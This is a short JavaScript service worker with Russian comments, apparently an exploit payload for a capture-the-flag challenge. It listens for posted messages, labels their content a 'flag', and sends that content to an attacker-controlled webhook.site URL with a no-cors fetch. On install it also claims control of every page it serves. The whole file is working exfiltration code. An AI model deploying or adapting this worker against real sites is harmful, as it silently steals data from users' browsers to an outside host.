// ЗАМЕНИТЕ ЭТОТ URL НА ВАШ УНИКАЛЬНЫЙ URL С WEBHOOK.SITE
const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";

// Обработчик для получения сообщений
self.addEventListener('message', event => {
    const flag = event.data;
    fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}`, { mode: 'no-cors' });
});

// Активация SW
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', event => event.waitUntil(clients.claim()));
